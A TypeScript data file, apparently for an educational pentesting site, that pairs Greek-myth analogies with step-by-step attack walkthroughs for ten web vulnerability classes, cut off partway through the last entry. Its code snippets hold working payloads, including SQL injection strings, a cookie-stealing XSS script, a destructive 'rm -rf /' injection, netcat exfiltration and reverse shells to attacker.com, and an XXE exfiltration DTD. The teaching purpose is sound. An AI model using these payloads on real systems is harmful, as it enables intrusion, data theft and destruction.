import React from 'react';
import { MythItem } from '../types';

export const MYTHOLOGY_DATA: MythItem[] = [
  {
    id: 'myth-sqli',
    slug: 'hydra-of-injection',
    title: 'The Hydra of SQL Injection',
    icon: "fas fa-database",
    narrative: "The Hydra, a many-headed serpent, guards the ancient databases of the digital realm. Each head represents a potential injection point. If one head is 'cut' (an input sanitized), two more may appear unless the core vulnerability is addressed. The hero (pentester) must find a way to poison the Hydra's heart (bypass sanitization or exploit a flaw) to extract the golden fleece (sensitive data).",
    vulnerabilityAnalogy: "SQL Injection (SQLi) allows attackers to interfere with the queries that an application makes to its database. It typically occurs when user-supplied input is not properly sanitized or escaped before being included in a SQL query. This can allow an attacker to view data they are not normally able to retrieve, modify or delete data, or even gain administrative control over the database server.",
    steps: [
      { id: 'sqli-s1', title: 'Reconnaissance: Identify Input Vectors', codeSnippet: "# Discover input fields, URL parameters, HTTP headers\n# Example: Searching for parameters like id=, user=, search=\n# Use browser dev tools, Burp Suite, or ZAP to map inputs", explanation: "Find all places the application accepts user data." },
      { id: 'sqli-s2', title: 'Probing: Basic Injection Tests', codeSnippet: "# Test with single quotes, double quotes, comments\n# ' or 1=1--\n# \" or 1=1#\n# payload: example.com/product?id=1' OR '1'='1", explanation: "Attempt simple SQL metacharacters to see if they break queries or reveal errors." },
      { id: 'sqli-s3', title: 'Error-Based SQLi: Exposing Database Structure', codeSnippet: "# Induce database errors that reveal table/column names\n# UNION SELECT @@version -- (MySQL)\n# UNION SELECT NULL, version(), NULL -- (PostgreSQL example for 3 columns)\n# payload: example.com/product?id=1 UNION SELECT @@version,NULL,NULL", explanation: "Craft queries that cause the database to leak information through error messages." },
      { id: 'sqli-s4', title: 'UNION-Based SQLi: Extracting Data', codeSnippet: "# Determine number of columns\n# ' ORDER BY 1--\n# ' ORDER BY 2-- ...etc.\n# ' UNION SELECT column1, column2 FROM information_schema.tables-- (MySQL)\n# payload: example.com/product?id=-1 UNION SELECT NULL,table_name,table_schema FROM information_schema.tables", explanation: "Use UNION operator to combine results of your query with the application's query, to exfiltrate data." },
      { id: 'sqli-s5', title: 'Blind SQLi: Inferring Data', codeSnippet: "# Time-based: ' AND SLEEP(5)--\n# Boolean-based: ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--\n# payload: example.com/product?id=1' AND SLEEP(5)", explanation: "When no direct output is shown, infer data by observing application's response to true/false conditions or time delays." },
      { id: 'sqli-s6', title: 'Automation with sqlmap', codeSnippet: "sqlmap -u \"http://example.com/product?id=1\" --dbs --batch\nsqlmap -u \"http://example.com/product?id=1\" -D database_name -T table_name --dump", explanation: "Use tools like sqlmap to automate detection and exploitation." }
    ],
    resources: [
      { name: 'OWASP: SQL Injection', url: 'https://owasp.org/www-community/attacks/SQL_Injection', icon: "fas fa-book-open" },
      { name: 'PortSwigger: SQL Injection', url: 'https://portswigger.net/web-security/sql-injection', icon: "fas fa-flask" },
      { name: 'sqlmap Official Site', url: 'http://sqlmap.org/', icon: "fas fa-tools" }
    ]
  },
  {
    id: 'myth-auth',
    slug: 'sphinx-of-authentication',
    title: 'The Sphinx of Authentication',
    icon: "fas fa-user-secret",
    narrative: "The Sphinx, a creature of riddles and gatekeeping, guards the entrances to secure systems. It presents challenges (login forms, password checks) to all who approach. Only those who can answer its riddles correctly (provide valid credentials) or trick it (exploit authentication flaws) may pass. A wrong answer or failed trick can lead to being devoured (locked out or detected).",
    vulnerabilityAnalogy: "Broken Authentication refers to vulnerabilities in how an application manages user identity, credentials, and session states. Attackers can exploit these flaws to impersonate legitimate users, gain unauthorized access to accounts, or escalate privileges. This covers a wide range of issues from weak password policies to session hijacking.",
    steps: [
      { id: 'auth-s1', title: 'Credential Brute-Forcing', codeSnippet: "# Use tools like Hydra, Burp Intruder, or custom scripts\n# Target login forms (username/password)\n# hydra -l user -P common_passwords.txt example.com http-post-form \"/login.php:user=^USER^&pass=^PASS^:F=Invalid\"\n# Consider password spraying (one password against many usernames)", explanation: "Attempt to guess credentials using common wordlists or previously breached passwords." },
      { id: 'auth-s2', title: 'Session Management Flaws', codeSnippet: "# Check for predictable session tokens (e.g., sequential IDs)\n# Test session fixation (forcing a user's session ID)\n# Analyze session token entropy and expiration\n# Look for tokens in URLs (insecure)", explanation: "Exploit weaknesses in how session tokens are generated, transmitted, or validated." },
      { id: 'auth-s3', title: 'Weak Password Recovery', codeSnippet: "# Test password reset mechanisms for flaws:\n# - Predictable reset tokens\n# - Host header injection in reset links\n# - Insufficient identity verification (e.g., only email or insecure questions)", explanation: "Identify vulnerabilities in the 'forgot password' functionality." },
      { id: 'auth-s4', title: 'Credential Stuffing', codeSnippet: "# Similar to brute-forcing, but uses known breached credentials\n# (username:password pairs from previous data breaches)\n# Assume users reuse passwords across services", explanation: "Leverage password reuse by testing credentials leaked from other breaches." },
      { id: 'auth-s5', title: 'Bypassing Multi-Factor Authentication (MFA)', codeSnippet: "# Look for MFA implementation flaws:\n# - Leaked backup codes\n# - Flaws in token generation or validation\n# - Social engineering to obtain OTPs (e.g., MFA fatigue attacks)\n# - Checking if MFA can be disabled post-login by exploiting other vulns", explanation: "Attempt to circumvent or find weaknesses in the second factor of authentication." },
      { id: 'auth-s6', title: 'JWT (JSON Web Token) Misconfigurations', codeSnippet: "# Check for 'alg:none' vulnerability\n# Test for weak signing keys (e.g., using jwt_tool)\n# Look for sensitive data in JWT payload (not encrypted by default)\n# Ensure proper signature validation", explanation: "Exploit common misconfigurations in JSON Web Tokens." }
    ],
    resources: [
      { name: 'OWASP: Broken Authentication', url: 'https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/', icon: "fas fa-book-open" },
      { name: 'PortSwigger: Authentication', url: 'https://portswigger.net/web-security/authentication', icon: "fas fa-flask" },
      { name: 'Hydra Tool', url: 'https://github.com/vanhauser-thc/thc-hydra', icon: "fas fa-tools" }
    ]
  },
  {
    id: 'myth-privesc',
    slug: 'minotaur-of-privilege-escalation',
    title: 'The Minotaur of Privilege Escalation',
    icon: "fas fa-user-shield",
    narrative: "Deep within a labyrinthine system lies the Minotaur, representing high-privilege access. Many paths (user roles, functions) exist within the labyrinth, but most lead to dead ends or low-privilege areas. The hero must navigate this maze, exploiting flaws in the walls (ACLs, authorization checks) or finding secret passages (IDORs, misconfigurations) to reach the Minotaur's chamber and claim its power (administrative rights).",
    vulnerabilityAnalogy: "Privilege Escalation occurs when an attacker with limited access to a system or application is able to gain higher levels of permissions or access to more sensitive data than they are authorized for. This can be horizontal (accessing another user's data at the same privilege level) or vertical (gaining admin-level access).",
    steps: [
      { id: 'privesc-s1', title: 'Insecure Direct Object References (IDOR)', codeSnippet: "# Test changing IDs in URLs or API requests:\n# /user/123/profile -> /user/124/profile\n# /api/orders?order_id=abc -> /api/orders?order_id=xyz\n# Check for GUIDs or other predictable identifiers.", explanation: "Manipulate user-supplied identifiers to access unauthorized resources." },
      { id: 'privesc-s2', title: 'Function Level Access Control Bypass', codeSnippet: "# Attempt to directly access admin functions or pages:\n# /admin/dashboard (even if not linked for normal users)\n# /api/users/delete?id=1 (if a normal user can call admin API endpoints)\n# Change HTTP method (GET to POST for admin actions)", explanation: "Directly call functions or access URLs intended for higher-privileged users." },
      { id: 'privesc-s3', title: 'Exploiting Misconfigured Access Controls (ACLs)', codeSnippet: "# Check file/directory permissions on the server if filesystem access is possible.\n# Look for overly permissive API gateway rules.\n# Test if group memberships grant unintended rights.", explanation: "Identify and leverage flaws in how permissions are set or enforced." },
      { id: 'privesc-s4', title: 'Path Traversal / File Inclusion', codeSnippet: "# Test for LFI/RFI to read sensitive files or execute code:\n# /view?page=../../../etc/passwd\n# /include?file=http://attacker.com/shell.txt\n# If successful, can lead to reading config files with creds or system files.", explanation: "Use directory traversal to access files outside the intended web root, potentially leading to information disclosure or code execution." },
      { id: 'privesc-s5', title: 'Exploiting Chained Vulnerabilities', codeSnippet: "# Example: XSS to steal admin session token.\n# Example: SQLi to extract admin credentials or modify user roles.\n# Combine info disclosure with other vulns to escalate.", explanation: "Combine multiple lower-severity vulnerabilities to achieve a higher impact, such as privilege escalation." },
      { id: 'privesc-s6', title: 'Local Privilege Escalation (Post-Exploitation)', codeSnippet: "# (If shell access is gained with low privs)\n# Check for SUID/SGID binaries: find / -perm -4000 -type f 2>/dev/null\n# Look for weak service permissions, cron jobs running as root.\n# Use tools like LinEnum.sh or PEASS-ng.", explanation: "If initial access is gained, escalate privileges on the underlying operating system." }
    ],
    resources: [
      { name: 'OWASP: Broken Access Control', url: 'https://owasp.org/Top10/A01_2021-Broken_Access_Control/', icon: "fas fa-book-open" },
      { name: 'PortSwigger: Access Control', url: 'https://portswigger.net/web-security/access-control', icon: "fas fa-flask" },
      { name: 'PayloadsAllTheThings: IDOR', url: 'https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Direct%20Object%20Reference', icon: "fab fa-github" }
    ]
  },
  {
    id: 'myth-xss',
    slug: 'siren-of-cross-site-scripting',
    title: "The Siren's Call of XSS",
    icon: "fas fa-code",
    narrative: "The Sirens, with their enchanting songs, lure unsuspecting sailors (users' browsers) towards treacherous shores. Their songs (malicious scripts) are embedded within the very fabric of the sea (web pages). Once a sailor hears the song (browser executes the script), their ship (session) can be commandeered, their cargo (data) stolen, or they can be redirected to perilous waters (malicious sites).",
    vulnerabilityAnalogy: "Cross-Site Scripting (XSS) allows attackers to inject client-side scripts into web pages viewed by other users. This occurs when an application includes untrusted data in a new web page without proper validation or escaping, or updates an existing web page with user-supplied data using a browser API that can create HTML or JavaScript. XSS can be used to steal session cookies, deface websites, redirect users, or install malware.",
    steps: [
      { id: 'xss-s1', title: "Identifying Potential Injection Points", codeSnippet: "# Look for user inputs reflected in HTML, JS, or CSS contexts.\n# Examples: search queries, comments, profile fields, URL parameters.\n# Test with non-malicious strings: <test>, 'test', \"test\"", explanation: "Find where user input is displayed on the page or used in client-side code." },
      { id: 'xss-s2', title: "Reflected XSS (Non-Persistent)", codeSnippet: "# Script is injected via a request and reflected back in the response.\n# example.com/search?query=<script>alert('XSS')</script>\n# The payload is often part of a crafted URL.", explanation: "Inject script that is immediately returned and executed by the victim's browser." },
      { id: 'xss-s3', title: "Stored XSS (Persistent)", codeSnippet: "# Script is stored on the server (e.g., in a database) and served to multiple users.\n# Example: Malicious script in a comment or forum post.\n# <img src=x onerror=alert(document.cookie)>", explanation: "Inject script that is saved by the server and later served to other users." },
      { id: 'xss-s4', title: "DOM-based XSS", codeSnippet: "# Vulnerability exists in client-side code rather than server-side.\n# document.location.hash -> document.write(location.hash.substring(1))\n# example.com/page#<img src=x onerror=alert(1)>\n# Payloads might not reach the server.", explanation: "Exploit client-side JavaScript that improperly handles data from the DOM." },
      { id: 'xss-s5', title: "Bypassing Filters and WAFs", codeSnippet: "# Use different HTML tags/attributes: <svg onload=alert(1)>, <body onload=alert(1)>\n# Event handlers: onmouseover, onerror, onfocus\n# Obfuscation: String.fromCharCode(), hex/unicode encoding.\n# Case variations: <ScRiPt>alert(1)</ScRiPt>", explanation: "Employ various encoding and payload techniques to evade input sanitization or Web Application Firewalls." },
      { id: 'xss-s6', title: "Exploitation: Session Hijacking & More", codeSnippet: "# Steal cookies: <script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>\n# Keylogging, phishing, redirecting users, performing actions as the user.\n# Use tools like BeEF (Browser Exploitation Framework).", explanation: "Leverage XSS to perform malicious actions, often by stealing session tokens or manipulating the DOM." }
    ],
    resources: [
      { name: 'OWASP: Cross-Site Scripting', url: 'https://owasp.org/www-community/attacks/xss/', icon: "fas fa-book-open" },
      { name: 'PortSwigger: Cross-Site Scripting', url: 'https://portswigger.net/web-security/cross-site-scripting', icon: "fas fa-flask" },
      { name: 'BeEF Project', url: 'https://beefproject.com/', icon: "fas fa-tools" }
    ]
  },
  {
    id: 'myth-csrf',
    slug: 'trojan-horse-of-csrf',
    title: 'The Trojan Horse of CSRF',
    icon: "fas fa-horse-head",
    narrative: "The Trojan Horse, a seemingly harmless gift, is brought within the city walls (a user's authenticated browser session). Unbeknownst to the defenders (the user), hidden within are warriors (malicious requests) that, once inside, can wreak havoc, performing actions on behalf of the authenticated user without their direct consent or knowledge.",
    vulnerabilityAnalogy: "Cross-Site Request Forgery (CSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they are currently authenticated. With a little help of social engineering (such as sending a link via email or chat), an attacker may trick the users of a web application into executing actions of the attacker's choosing. If the victim is an administrative account, CSRF can compromise the entire web application.",
    steps: [
      { id: 'csrf-s1', title: "Identify Sensitive Actions", codeSnippet: "# Look for state-changing requests: password changes, email updates, item purchases, fund transfers, creating posts.\n# These are typically POST requests but GET requests can also be vulnerable.\n# Example: POST /user/update_email new_email=attacker@evil.com", explanation: "Find application functions that modify data or perform significant actions." },
      { id: 'csrf-s2', title: "Check for Anti-CSRF Tokens", codeSnippet: "# Inspect forms and AJAX requests for unpredictable, per-session tokens.\n# Look for hidden input fields: <input type='hidden' name='csrf_token' value='...'>\n# Check HTTP headers for tokens: X-CSRF-Token.", explanation: "Determine if the application uses tokens to prevent CSRF." },
      { id: 'csrf-s3', title: "Crafting a CSRF PoC (GET requests)", codeSnippet: "# If a sensitive action is performed via GET:\n# <img src=\"http://vulnerable-site.com/transfer_funds?to=attacker&amount=1000\" width=\"1\" height=\"1\" />\n# Victim visiting a page with this <img> tag would trigger the request.", explanation: "Create a simple HTML element that, when rendered by the victim's browser, makes the malicious GET request." },
      { id: 'csrf-s4', title: "Crafting a CSRF PoC (POST requests)", codeSnippet: "# Create an auto-submitting HTML form:\n# <form id='csrf_form' action='http://vulnerable-site.com/change_password' method='POST'>\n#   <input type='hidden' name='new_password' value='hacked123' />\n#   <input type='hidden' name='confirm_password' value='hacked123' />\n# </form>\n# <script>document.getElementById('csrf_form').submit();</script>", explanation: "Construct an HTML form that automatically submits to the target endpoint with malicious data." },
      { id: 'csrf-s5', title: "Bypassing CSRF Defenses", codeSnippet: "# Token not validated? Token tied to session but not action?\n# Token leaked inReferer header? CSRF token present in GET request?\n# Check SameSite cookie attribute (Lax/Strict might prevent some CSRF).\n# If XHR request, check if 'Content-Type' other than 'application/x-www-form-urlencoded', 'multipart/form-data', 'text/plain' triggers preflight.", explanation: "Investigate weaknesses in anti-CSRF mechanisms or browser security features." },
      { id: 'csrf-s6', title: "Delivering the Payload", codeSnippet: "# Host the malicious HTML/JS on an attacker-controlled site.\n# Trick the victim into visiting the attacker's site while logged into the vulnerable application.\n# Use social engineering, phishing emails, or malicious ads.", explanation: "Find a way to make the authenticated victim's browser submit the crafted malicious request." }
    ],
    resources: [
      { name: 'OWASP: Cross-Site Request Forgery', url: 'https://owasp.org/www-community/attacks/csrf', icon: "fas fa-book-open" },
      { name: 'PortSwigger: CSRF', url: 'https://portswigger.net/web-security/csrf', icon: "fas fa-flask" },
      { name: 'CSRF Token Bypass Cheatsheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#csrf-token-bypass-techniques', icon: "fas fa-list-alt" }
    ]
  },
  {
    id: 'myth-ssrf',
    slug: 'oracle-of-server-side-request-forgery',
    title: 'The Oracle of SSRF',
    icon: "fas fa-server",
    narrative: "An ancient, all-knowing Oracle (the server) can be queried by seekers (users). However, a clever trickster might persuade the Oracle to consult forbidden tomes or speak to other entities within its own sanctum (internal network), revealing secrets or performing actions it was never meant to. The Oracle, bound by its nature to fetch and respond, becomes an unwitting agent for the trickster.",
    vulnerabilityAnalogy: "Server-Side Request Forgery (SSRF) is a web security vulnerability that allows an attacker to induce the server-side application to make HTTP requests to an arbitrary domain of the attacker's choosing. In a typical SSRF attack, the attacker might cause the server to make a connection back to itself, or to other web-based services within the organization's infrastructure, or to external third-party systems.",
    steps: [
      { id: 'ssrf-s1', title: "Identify SSRF Vectors", codeSnippet: "# Look for functionalities where the server fetches resources based on user input:\n# - URL parameters: ?url=, ?file=, ?image_url=\n# - POST body data, XML/JSON payloads containing URLs.\n# - PDF generators, image processors, webhook consumers.", explanation: "Find application features that make server-side requests using user-controlled URLs." },
      { id: 'ssrf-s2', title: "Basic SSRF: Accessing External Resources", codeSnippet: "# Test if the server can make requests to external attacker-controlled sites.\n# Example: ?url=http://attacker-collaborator.net/log_hit\n# This confirms the server is making outbound requests.", explanation: "Verify if the server will make requests to arbitrary external domains." },
      { id: 'ssrf-s3', title: "Accessing Internal Network Resources", codeSnippet: "# Try common internal IP addresses and hostnames:\n# - http://localhost/, http://127.0.0.1/\n# - http://169.254.169.254/ (Cloud metadata for AWS, GCP, Azure)\n# - Internal IPs: 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16\n# - Common ports: :80, :443, :8080, :22 (using gopher:// or dict:// if supported)", explanation: "Attempt to make the server request resources from its own internal network." },
      { id: 'ssrf-s4', title: "Bypassing Denylists/Filters", codeSnippet: "# If direct IPs are blocked, try:\n# - Using subdomains that resolve to internal IPs.\n# - URL encoding: %31%32%37%2e%30%2e%30%2e%31 for 127.0.0.1\n# - Using different IP formats: decimal (2130706433), octal (017700000001).\n# - Using IPv6 [::]:  http://[::]:80/\n# - Utilizing URL shorteners or open redirects.", explanation: "Employ various encoding and redirection techniques to circumvent input validation or network filters." },
      { id: 'ssrf-s5', title: "Port Scanning Internal Networks", codeSnippet: "# Systematically try different internal IPs and common ports.\n# Example: ?url=http://192.168.1.1:80, ?url=http://192.168.1.1:22, ...\n# Observe error messages or response times to infer open/closed ports.", explanation: "Use the SSRF vulnerability to map open ports on internal hosts." },
      { id: 'ssrf-s6', title: "Advanced SSRF: Reading Files or RCE (protocol-dependent)", codeSnippet: "# Using file:// protocol (if allowed by parser):\n# ?url=file:///etc/passwd or file:///c:/windows/win.ini\n# Using gopher:// or dict:// for more complex interactions (e.g., crafting raw TCP packets for services like Redis or Memcached).\n# Example gopher payload (conceptual for Redis): gopher://127.0.0.1:6379/_%2A1%0D%0A%244%0D%0AINFO%0D%0A", explanation: "Leverage SSRF with specific URL schemes to read local files or interact with internal services in ways that might lead to RCE." }
    ],
    resources: [
      { name: 'OWASP: Server-Side Request Forgery', url: 'https://owasp.org/www-community/attacks/Server_Side_Request_Forgery', icon: "fas fa-book-open" },
      { name: 'PortSwigger: SSRF', url: 'https://portswigger.net/web-security/ssrf', icon: "fas fa-flask" },
      { name: 'PayloadsAllTheThings: SSRF', url: 'https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery', icon: "fab fa-github" }
    ]
  },
  {
    id: 'myth-command-injection',
    slug: 'golem-of-command-injection',
    title: 'The Golem of Command Injection',
    icon: "fas fa-terminal",
    narrative: "A powerful but mindless Golem (the system shell) can be controlled by embedding arcane commands (malicious input) into its instructions (user-supplied data). If the Golem's master (the application) doesn't sanitize these instructions, the Golem can be turned against its creator, executing any command whispered to it.",
    vulnerabilityAnalogy: "Command Injection occurs when an application passes unsanitized user input as part of a command executed by the operating system. This allows attackers to execute arbitrary system commands, potentially leading to full system compromise.",
    steps: [
      { id: 'cmdinj-s1', title: 'Identify Input Vectors', codeSnippet: "# Look for parameters, form fields, or other inputs passed to system() or exec() like functions.\n# Examples: ?filename=, ?host= for ping, image processing libraries.", explanation: "Find where user input might be used in OS commands." },
      { id: 'cmdinj-s2', title: 'Test Shell Metacharacters', codeSnippet: "# Try injecting: ; | && || \` $( ) \\n\n# example.com/ping?host=8.8.8.8;ls -la\n# example.com/convert?image=file.jpg;rm -rf /", explanation: "Use shell operators to append or chain commands." },
      { id: 'cmdinj-s3', title: 'Blind Command Injection', codeSnippet: "# If no direct output, use time delays: ; sleep 5\n# Or out-of-band interaction: ; nslookup \`whoami\`.attacker.com", explanation: "Infer command execution by observing side effects." },
      { id: 'cmdinj-s4', title: 'Data Exfiltration', codeSnippet: "# Redirect command output to web root or use netcat/curl.\n# ; cat /etc/passwd > /var/www/html/passwd.txt\n# ; cat /etc/passwd | nc attacker.com 1234", explanation: "Steal sensitive files from the server." },
      { id: 'cmdinj-s5', title: 'Reverse Shell', codeSnippet: "# Get interactive shell access.\n# ; bash -i >& /dev/tcp/attacker.com/4444 0>&1\n# ; python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'", explanation: "Establish a callback shell to the attacker's machine." },
      { id: 'cmdinj-s6', title: 'Bypassing Filters', codeSnippet: "# Use alternative syntax: ${IFS} instead of space, printf for char codes.\n# Encoding: URL encode, hex encode.\n# ; /???/???/n? ??????t?.??? ???.??? # (globbing for /usr/bin/nc attacker.com 1234)", explanation: "Evade simple input sanitization or WAF rules." }
    ],
    resources: [
      { name: 'OWASP: Command Injection', url: 'https://owasp.org/www-community/attacks/Command_Injection', icon: "fas fa-book-open" },
      { name: 'PortSwigger: Command Injection', url: 'https://portswigger.net/web-security/os-command-injection', icon: "fas fa-flask" },
      { name: 'PayloadsAllTheThings: Command Injection', url: 'https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection', icon: "fab fa-github" }
    ]
  },
  {
    id: 'myth-xxe',
    slug: 'oracle-of-xml',
    title: 'The Oracle of XML (XXE)',
    icon: "fas fa-book-dead",
    narrative: "An ancient Oracle (XML parser) reads scrolls (XML documents). If a scroll references a forbidden external entity (malicious DTD), the Oracle might reveal secrets from its library (local files), speak to other spirits (internal network requests), or be overwhelmed by endless incantations (billion laughs).",
    vulnerabilityAnalogy: "XML External Entity (XXE) Injection allows an attacker to interfere with an application's processing of XML data. It often allows an attacker to view files on the application server filesystem, interact with any backend or external systems that the application itself can access, or cause a denial of service.",
    steps: [
      { id: 'xxe-s1', title: 'Identify XML Input Points', codeSnippet: "# Look for features that process XML: file uploads (e.g. .docx, .xlsx are zip files with XML), POST bodies with Content-Type: application/xml.", explanation: "Find where the application accepts XML data." },
      { id: 'xxe-s2', title: 'Basic File Disclosure (In-Band)', codeSnippet: "<!-- Payload for XML input -->\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>\n<data>&xxe;</data>", explanation: "Attempt to read a local file and have its content returned in the response." },
      { id: 'xxe-s3', title: 'SSRF via XXE', codeSnippet: "<!-- Payload for XML input -->\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"http://internal-metadata-server/latest/meta-data/\"> ]>\n<data>&xxe;</data>", explanation: "Force the server to make requests to internal or external URLs." },
      { id: 'xxe-s4', title: 'Billion Laughs Attack (DoS)', codeSnippet: "<!-- Payload for XML input -->\n<?xml version=\"1.0\"?>\n<!DOCTYPE lolz [\n <!ENTITY lol \"lol\">\n <!ENTITY lol1 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\"> \n <!-- ... many more nested entities ... -->\n]>\n<lolz>&lol9;</lolz>", explanation: "Overwhelm the XML parser by recursively expanding entities, consuming memory and CPU." },
      { id: 'xxe-s5', title: 'Blind XXE (Out-of-Band Data Exfiltration)', codeSnippet: "# Conceptual: Use parameter entities and an external DTD.\n# Attacker DTD (evil.dtd):\n# <!ENTITY % file SYSTEM \"file:///etc/secret.txt\">\n# <!ENTITY % exfiltrate \"<!ENTITY &#x25; send SYSTEM 'http://attacker.com/?content=%file;'>\">\n# %exfiltrate;\n# %send;\n# XML Payload:\n# <!DOCTYPE foo [ <!ENTITY % remote SYSTEM \"http://attacker.com/evil.dtd\"> %remote; ]><foo/>", explanation: "When direct response isn't available, exfiltrate data via secondary channels like HTTP requests or DNS lookups to an attacker-controlled server." },
      { id: 'xxe-s6', title: 'Check Parser Configuration', codeSnippet: "# Ensure XML parsers are configured to disable DTDs or external entity resolution.\n# Example (Java JAXP): factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);", explanation: "The most effective mitigation is to disable vulnerable parser features." }
    ],
    resources: [
      { name: 'OWASP: XML External Entity (XXE) Processing', url: 'https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing', icon: "fas fa-book-open" },
      { name: 'PortSwigger: XXE Injection', url: 'https://portswigger.net/web-security/xxe', icon: "fas fa-flask" },
      { name: 'PayloadsAllTheThings: XXE Injection', url: 'https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection', icon: "fab fa-github" }
    ]
  },
  {
    id: 'myth-deserialization',
    slug: 'pandoras-box-of-deserialization',
    title: "Pandora's Box of Deserialization",
    icon: "fas fa-box-open",
    narrative: "Pandora's Box (a serialized object) holds untold power, often passed between systems or stored for later use. If an application naively opens any box presented to it (deserializes untrusted data) without inspecting its true nature, it might unleash plagues and evils (arbitrary code execution, denial of service) upon itself.",
    vulnerabilityAnalogy: "Insecure Deserialization occurs when an application deserializes data from an untrusted source without proper validation. Attackers can craft malicious serialized objects that, when processed, trigger unintended code execution or other harmful effects by exploiting the application's existing classes and methods (gadget chains).",
    steps: [
      { id: 'deser-s1', title: 'Identify Serialized Data Inputs', codeSnippet: "# Look for Base64 encoded strings in cookies, parameters, HTTP bodies.\n# Check Content-Types: application/x-java-serialized-object, application/octet-stream.\n# Common patterns: 'rO0' (Java), 'ACED' (Java magic bytes in hex), 'pickle' (Python).", explanation: "Find where the application accepts or processes serialized objects." },
      { id: 'deser-s2', title: 'Determine Language/Framework', codeSnippet: "# Identify the technology stack (Java, .NET, Python, PHP, Ruby).\n# This dictates the types of gadget chains and tools to use.", explanation: "The exploitation technique is highly platform-specific." },
      { id: 'deser-s3', title: 'Find/Develop Gadget Chains', codeSnippet: "# Research known gadget chains for the target platform's libraries (e.g., Apache Commons Collections for Java).\n# Use tools like ysoserial (Java), PHPGGC (PHP), or write custom ones.\n# A gadget chain is a sequence of method calls on existing classes that leads to RCE.", explanation: "Exploits typically rely on classes available in the application's classpath." },
      { id: 'deser-s4', title: 'Craft Malicious Serialized Object', codeSnippet: "# Using ysoserial (Java Example):\n# java -jar ysoserial.jar CommonsCollections5 'calc.exe' > payload.ser\n# This creates a payload that, when deserialized, executes 'calc.exe'.", explanation: "Generate the actual malicious object stream." },
      { id: 'deser-s5', title: 'Submit Payload and Observe Impact', codeSnippet: "# Send the payload (e.g., base64 encoded) in the identified input vector.\n# Monitor for signs of RCE (reverse shell, command output) or DoS.", explanation: "Deliver the payload to trigger the vulnerability." },
      { id: 'deser-s6', title: 'Mitigation Strategies', codeSnippet: "# Avoid deserializing untrusted data if possible.\n# Use safer data formats like JSON if object semantics aren't needed.\n# Implement integrity checks (signatures) on serialized data.\n# Keep libraries updated to patch known gadget chains.", explanation: "Preventing deserialization of untrusted input is the best defense." }
    ],
    resources: [
      { name: 'OWASP: Insecure Deserialization', url: 'https://owasp.org/www-project-top-ten/2017/A8_2017-Insecure_Deserialization', icon: "fas fa-book-open" },
      { name: 'PortSwigger: Insecure Deserialization', url: 'https://portswigger.net/web-security/deserialization', icon: "fas fa-flask" },
      { name: 'ysoserial (Java tool)', url: 'https://github.com/frohoff/ysoserial', icon: "fab fa-java" }
    ]
  },
  {
    id: 'myth-directory-traversal',
    slug: 'labyrinth-of-directory-traversal',
    title: 'The Labyrinth of Directory Traversal',
    icon: "fas fa-dungeon",
    narrative: "A Labyrinth with many winding paths guards sacred files. Many paths seem to lead to public scrolls (web content), but hidden passages (`../`) allow a clever intruder to navigate outside the intended routes and access restricted chambers (sensitive files beyond the web root).",
    vulnerabilityAnalogy: "Directory Traversal (also known as Path Traversal) allows an attacker to read arbitrary files on the server that is running an application. This might include application code and data, credentials for back-end systems, and sensitive operating system files. It occurs when the application uses user-supplied input to construct file paths without proper validation.",
    steps: [
      { id: 'dirtrav-s1', title: 'Identify File Path Input Parameters', codeSnippet: "# Look for parameters in URLs or POST data that seem to reference files or templates.\n# Examples: ?file=myfile.txt, ?page=about.html, /images?filename=logo.png", explanation: "Find where user input is used to access files." },
      { id: 'dirtrav-s2', title: 'Test Basic Traversal Sequences', codeSnippet: "# Try classic 'dot-dot-slash' sequences.\n# ?file=../../../../etc/passwd (Linux)\n# ?file=..\\..\\..\\..\\boot.ini (Windows)", explanation: "Attempt to navigate up the directory tree." },
      { id: 'dirtrav-s3', title: 'Filter Bypassing Techniques', codeSnippet: "# URL Encoding: %2e%2e%2f or ..%2f or %2e%2e/\n# Double URL Encoding: %252e%252e%252f\n# Overlong UTF-8 Unicode encoding.\n# Using absolute paths if web root is known or guessable.\n# Variations: ....//, ..///..///, etc.", explanation: "Evade common filters that block or sanitize '../'." },
      { id: 'dirtrav-s4', title: 'Target Known Sensitive Files', codeSnippet: "# Linux: /etc/passwd, /etc/shadow, /etc/hosts, web server logs, app config files.\n# Windows: C:\\Windows\\win.ini, C:\\boot.ini, web server config files (web.config).\n# Application source code: view_source.php?file=../../app/config.php", explanation: "Aim for files containing credentials, configurations, or system information." },
      { id: 'dirtrav-s5', title: 'Null Byte Injection (Older Systems)', codeSnippet: "# If backend language is vulnerable (e.g., older PHP, C/C++ applications):\n# ?file=../../../../etc/passwd%00.jpg\n# The null byte (%00) might terminate the string before the expected extension.", explanation: "Bypass checks that rely on specific file extensions." },
      { id: 'dirtrav-s6', title: 'Contextual Traversal', codeSnippet: "# Within ZIP file uploads (filename in ZIP contains traversal).\n# In template engines if they load templates from filesystem using user input.\n# Example: /profile_image?user_id=1&image_name=../../../../etc/passwd", explanation: "Look for traversal in less obvious places than direct file parameters." }
    ],
    resources: [
      { name: 'OWASP: Path Traversal', url: 'https://owasp.org/www-community/attacks/Path_Traversal', icon: "fas fa-book-open" },
